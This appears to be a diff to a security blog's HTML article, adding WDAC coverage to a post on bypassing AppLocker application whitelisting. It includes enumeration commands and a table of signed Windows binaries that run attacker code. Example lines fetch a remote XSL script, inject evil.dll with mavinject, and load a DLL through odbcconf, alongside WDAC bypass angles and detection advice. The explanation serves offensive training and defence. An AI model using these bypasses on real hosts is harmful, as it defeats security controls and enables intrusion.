@@ -3,18 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AppLocker Bypass — Satej Chaudhari</title>
-  <meta name="description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <title>AppLocker &amp; WDAC Bypass — Satej Chaudhari</title>
+  <meta name="description" content="How Windows application whitelisting is enumerated and bypassed — AppLocker rule collections, writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, Constrained Language Mode, and WDAC in depth (rule levels, signing, managed installer / ISG, and how WDAC is bypassed).">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="Satej Chaudhari">
-  <meta property="og:title" content="AppLocker Bypass">
-  <meta property="og:description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <meta property="og:title" content="AppLocker &amp; WDAC Bypass">
+  <meta property="og:description" content="How Windows application whitelisting is enumerated and bypassed — AppLocker rule collections, writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, Constrained Language Mode, and WDAC in depth (rule levels, signing, managed installer / ISG, and how WDAC is bypassed).">
   <meta property="og:url" content="https://satejchaudhari.com/theory/2026-10-08-applocker-bypass.html">
   <meta property="og:image" content="https://satejchaudhari.com/assets/img/og-default.png">
   <meta property="article:published_time" content="2026-10-08">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="AppLocker Bypass">
-  <meta name="twitter:description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <meta name="twitter:title" content="AppLocker &amp; WDAC Bypass">
+  <meta name="twitter:description" content="How Windows application whitelisting is enumerated and bypassed — AppLocker rule collections, writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, Constrained Language Mode, and WDAC in depth (rule levels, signing, managed installer / ISG, and how WDAC is bypassed).">
   <meta name="twitter:image" content="https://satejchaudhari.com/assets/img/og-default.png">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
@@ -71,10 +71,10 @@
     <article>
       <header class="post-header">
         <span class="tag">Evasion</span>
-        <h1 class="post-title">AppLocker Bypass</h1>
+        <h1 class="post-title">AppLocker &amp; WDAC Bypass</h1>
         <p class="post-meta">
           <time datetime="2026-10-08">2026-10-08</time>
-          <span>&middot; 11 min read</span>
+          <span>&middot; 16 min read</span>
         </p>
       </header>
 
@@ -91,6 +91,17 @@
           through a path it was never written to stop. This page is the mechanism
           behind the <a href="../ad-map.html">AD map's</a> "Bypass AppLocker"
           step.
+        </p>
+        <p>
+          It covers two layers. First <strong>AppLocker</strong> — how it is
+          built, how to read the effective policy, and the standard bypasses
+          (writable allowed paths, trusted LOLBins, unenforced collections,
+          Constrained Language Mode). Then <strong>WDAC</strong> (Windows Defender
+          Application Control, formerly Device Guard / Code Integrity) — the
+          newer, kernel-enforced control that replaces AppLocker in serious
+          environments, why it is a much harder target, and where it still gives.
+          The two are often confused; knowing which one you are actually facing
+          decides whether the easy tricks work at all.
         </p>
 
         <h2>How AppLocker actually works</h2>
@@ -138,13 +149,23 @@ Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
 
 # ask AppLocker directly whether a specific binary would be allowed for you
 Get-AppLockerPolicy -Effective |
-  Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User $env:USERNAME</code></pre>
+  Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User $env:USERNAME
+
+# AppLocker only enforces while the Application Identity service runs — check it
+Get-Service AppIDSvc
+# and review what it actually blocked/allowed historically:
+Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 20</code></pre>
         <p>
           Read it like a defender would: which collections say
           <code>Enforce</code>? Are the rules publisher-based (hard) or
           path-based (soft)? Is Dll or Script merely <code>AuditOnly</code> or
-          absent? The gaps you find decide which of the techniques below you
-          reach for.
+          absent? Is <code>AppIDSvc</code> even running (it is
+          <em>manual</em>-start on many builds, and rules do not apply until it
+          is)? The gaps you find decide which of the techniques below you reach
+          for. Note too that AppLocker is a <strong>user-mode</strong> control
+          enforced per-process — it does not stop code that never spawns a new
+          process, such as shellcode run inside an already-allowed process, which
+          is why in-memory tradecraft sidesteps it entirely.
         </p>
 
         <h2>Bypass 1 — Writable paths inside allowed directories</h2>
@@ -249,10 +270,23 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=GetO
             <tr><td><code>cmstp.exe</code></td><td>Executes commands from a crafted INF (Connection Manager profile)</td></tr>
             <tr><td><code>msiexec</code></td><td>Installs a local or remote <code>.msi</code> if the Msi collection is weak</td></tr>
             <tr><td><code>control.exe</code> / <code>.cpl</code></td><td>Loads a control-panel DLL (rides the unenforced Dll collection)</td></tr>
-            <tr><td><code>InstallUtil</code> / <code>regasm</code> / <code>regsvcs</code></td><td>Trigger .NET assembly methods during (un)install/registration</td></tr>
+            <tr><td><code>regasm</code> / <code>regsvcs</code></td><td>Trigger .NET assembly methods during (un)registration — InstallUtil's siblings</td></tr>
             <tr><td><code>wmic.exe</code></td><td><code>wmic ... /format:"https://host/evil.xsl"</code> runs a remote XSL script</td></tr>
+            <tr><td><code>Microsoft.Workflow.Compiler.exe</code></td><td>Compiles and runs arbitrary C#/XOML supplied as a workflow file</td></tr>
+            <tr><td><code>jsc.exe</code></td><td>The JScript.NET compiler — turn <code>.js</code> source into a signed-toolchain-built EXE/DLL on the host</td></tr>
+            <tr><td><code>ieexec.exe</code> / <code>presentationhost.exe</code></td><td>Run a remote .NET/XBAP application hosted over HTTP</td></tr>
+            <tr><td><code>mavinject.exe</code></td><td>Inject a DLL into a running process (<code>mavinject PID /INJECTRUNNING evil.dll</code>)</td></tr>
+            <tr><td><code>odbcconf.exe</code></td><td><code>odbcconf /a {REGSVR evil.dll}</code> loads a DLL like regsvr32</td></tr>
+            <tr><td><code>pcalua.exe</code> / <code>forfiles.exe</code></td><td>Signed launchers that spawn an arbitrary child process you name</td></tr>
           </tbody>
         </table>
+        <p>
+          The canonical, maintained catalogue of these is the
+          <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS
+          project</a> — filter it by the "AWL bypass" function to see every binary
+          currently known to defeat an allow-list, and check which of them your
+          target's policy forgot to deny.
+        </p>
 
         <h2>Bypass 3 — The unenforced collections</h2>
         <p>
@@ -281,6 +315,152 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=GetO
         <pre><code># CLM check — if this prints "ConstrainedLanguage" you are restricted
 $ExecutionContext.SessionState.LanguageMode</code></pre>
 
+        <h2>WDAC — the harder target</h2>
+        <p>
+          <strong>Windows Defender Application Control</strong> (WDAC, formerly
+          Device Guard / Configurable Code Integrity) is Microsoft's modern
+          replacement for AppLocker. Where AppLocker is a user-mode service that
+          vets each new process, WDAC is <strong>Code Integrity enforced in the
+          kernel</strong> — it decides what code is allowed to load, in both user
+          mode (UMCI) and optionally kernel mode (KMCI), before it ever runs. That
+          single difference removes most of the easy wins above, so the first job
+          on a modern host is to work out <em>which</em> control you are actually
+          facing.
+        </p>
+        <table>
+          <thead><tr><th>&nbsp;</th><th>AppLocker</th><th>WDAC</th></tr></thead>
+          <tbody>
+            <tr><td>Enforced by</td><td>Application Identity user-mode service (AppIDSvc)</td><td>Kernel Code Integrity (ci.dll), optionally with HVCI</td></tr>
+            <tr><td>Scope</td><td>Per user / group</td><td>Per device — applies to everyone, SYSTEM included</td></tr>
+            <tr><td>DLL control</td><td>Separate collection, off by default</td><td>Part of the core policy — libraries are checked too</td></tr>
+            <tr><td>Writable-path trick</td><td>Works (default %WINDIR% allows)</td><td>Does not — allow-by-location is discouraged and rare</td></tr>
+            <tr><td>Tamper resistance</td><td>Admin can stop the service / edit GPO</td><td>Signed + UEFI-locked policy survives even a local admin</td></tr>
+            <tr><td>.NET in-memory load</td><td>Allowed (execute-assembly works)</td><td>CLR honours the policy — unsigned/dynamic assemblies are blocked</td></tr>
+          </tbody>
+        </table>
+
+        <h3>The policy model</h3>
+        <p>
+          A WDAC policy is an XML document (usually generated from a Microsoft
+          template, then compiled to a binary <code>.cip</code>) made of
+          <strong>file rules</strong> that allow or deny code. Each rule is written
+          at a <strong>rule level</strong> that trades precision for
+          maintainability:
+        </p>
+        <ul>
+          <li><strong>Hash</strong> — exact file; breaks on every update (most precise, least maintainable).</li>
+          <li><strong>FilePath</strong> — by location; discouraged, and only safe for admin-only-writable paths.</li>
+          <li><strong>Publisher / FilePublisher</strong> — by code-signing certificate (and optionally file name + min version); the maintainable, recommended level.</li>
+          <li><strong>LeafCertificate / PcaCertificate / RootCertificate</strong> — trust a certificate higher up the chain, allowing <em>everything</em> it signed.</li>
+          <li><strong>WHQL / WHQLPublisher</strong> — for Microsoft-certified drivers (kernel mode).</li>
+        </ul>
+        <p>
+          Policies come in two kinds: a <strong>base</strong> policy and optional
+          <strong>supplemental</strong> policies that widen it. Since the
+          multiple-policy format, several base policies can coexist and are
+          <strong>intersected</strong> — a file must pass <em>every</em> active
+          policy to run, so a second policy can only tighten, never loosen. A
+          <strong>signed</strong> base policy deployed with a UEFI lock cannot be
+          removed or edited even by a local administrator without the signing key,
+          which is what makes a mature WDAC deployment genuinely hard to disable.
+        </p>
+
+        <h3>Enforcement, managed installer &amp; the ISG</h3>
+        <p>
+          Like AppLocker, WDAC runs in <strong>Audit</strong> mode (logs what it
+          <em>would</em> block — effectively off) or <strong>Enforced</strong> mode.
+          Two trust mechanisms are built in and both are attack surface:
+        </p>
+        <ul>
+          <li>
+            <strong>Managed Installer (MI).</strong> A deployment tool you trust —
+            typically SCCM/MEMCM or Intune — is tagged as a managed installer via a
+            companion AppLocker policy. Anything the MI <em>writes</em> is marked
+            with an NTFS attribute and auto-allowed thereafter. If you can get code
+            to run through, or masquerade as, the managed installer, your dropped
+            files inherit that trust.
+          </li>
+          <li>
+            <strong>Intelligent Security Graph (ISG).</strong> WDAC can defer to
+            Microsoft's cloud reputation and allow files it rates "known good". The
+            abuse is to ride a file that already has good reputation, or to get your
+            own to earn it — reputation is not a signature.
+          </li>
+        </ul>
+
+        <h3>Enumerating WDAC on a host</h3>
+        <pre><code># is WDAC on, and audit or enforced? (0 = off, 1 = audit, 2 = enforced)
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
+  Select-Object -ExpandProperty CodeIntegrityPolicyEnforcementStatus
+
+# list the active policies (Windows 11 22H2+), or read them from disk
+CiTool.exe --list-policies
+Get-ChildItem C:\Windows\System32\CodeIntegrity\CiPolicies\Active\*.cip
+
+# what did Code Integrity block or audit? the log is the ground truth
+Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 30
+# 3076 = would-block (audit)   3077 = blocked (enforced)   3089 = signing details</code></pre>
+        <p>
+          Audit mode is the first thing to hope for: if enforcement is
+          <code>1</code>, nothing is actually blocked and you only need to avoid
+          the noise in the log. Enforced (<code>2</code>) is the real fight.
+        </p>
+
+        <h3>Bypassing WDAC</h3>
+        <p>
+          There is no writable-path shortcut and no unenforced DLL collection, so
+          a WDAC bypass almost always means <strong>finding code the policy
+          already trusts and making it run yours</strong>. The recurring angles:
+        </p>
+        <ul>
+          <li>
+            <strong>Allowed Microsoft-signed LOLBins.</strong> This is the crux.
+            Most custom policies are built to "trust all Microsoft-signed code" for
+            convenience — and that set includes signed binaries that execute
+            arbitrary code: <code>msbuild</code>, <code>mshta</code>,
+            <code>wmic</code>, <code>Microsoft.Workflow.Compiler</code>,
+            <code>cdb</code>/<code>windbg</code>/<code>kd</code>,
+            <code>csi</code>/<code>rcsi</code>/<code>dnx</code>,
+            <code>fsi.exe</code>, and others. Microsoft publishes a
+            <strong>Recommended Block Rules</strong> list precisely to deny them; a
+            policy that trusts Microsoft but omits the block list is bypassable with
+            the same LOLBins used against AppLocker.
+          </li>
+          <li>
+            <strong>DLL sideloading into an allowed app.</strong> If a signed,
+            policy-allowed application loads a DLL from a directory you can write,
+            drop a malicious DLL with the expected name — it loads under the host
+            app's trust. (WDAC checks the DLL too, so this needs a path the policy
+            still trusts, e.g. one allowed by publisher or a signed-but-vulnerable
+            app.)
+          </li>
+          <li>
+            <strong>Abuse a trust anchor.</strong> Run code through the managed
+            installer so your output is auto-tagged as trusted, or get a file
+            blessed by the ISG. Both convert "untrusted" into "allowed" without a
+            signature.
+          </li>
+          <li>
+            <strong>Audit mode / gaps.</strong> If the policy is in audit, or lacks
+            a supplemental rule for a path that matters, or an admin can swap an
+            unsigned policy file on disk, those are the straightforward routes.
+          </li>
+          <li>
+            <strong>What usually does <em>not</em> work:</strong> in-memory .NET
+            loading. Under an enforced policy the CLR refuses to load unsigned or
+            dynamically-generated assemblies, so <code>execute-assembly</code>-style
+            tradecraft that sails past AppLocker frequently dies against WDAC — one
+            of the clearest signals of which control you are up against.
+          </li>
+        </ul>
+        <p>
+          The maintained reference for the signed binaries a policy must block is
+          Microsoft's documentation and the
+          <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>
+          AWL-bypass set; a WDAC policy's real strength is measured by how much of
+          that it denies.
+        </p>
+
         <h2>Detection &amp; remediation</h2>
         <ul>
           <li>
@@ -306,6 +486,22 @@ $ExecutionContext.SessionState.LanguageMode</code></pre>
             <strong>8003</strong> audit / <strong>8004</strong> blocked) and the
             MSI/Script log — and alert on the LOLBins above executing with
             network-facing or scriptlet arguments.
+          </li>
+          <li>
+            <strong>Move to WDAC where you can</strong>, and treat Microsoft's
+            <em>Recommended Block Rules</em> as mandatory — a policy that trusts
+            Microsoft-signed code but omits the block list is bypassable on day one.
+            Start in audit, drive the <code>CodeIntegrity/Operational</code> log to
+            zero legitimate blocks, then enforce; <strong>sign the policy and lock
+            it with UEFI</strong> so a local admin cannot strip it, and pair it with
+            <strong>HVCI</strong> for kernel-mode protection.
+          </li>
+          <li>
+            <strong>Constrain the trust anchors:</strong> scope the managed installer
+            tightly (only genuine deployment tools), think twice before enabling the
+            ISG, and prefer publisher/FilePublisher rules over broad certificate or
+            path rules so one trusted CA does not implicitly allow everything it ever
+            signed.
           </li>
         </ul>
 
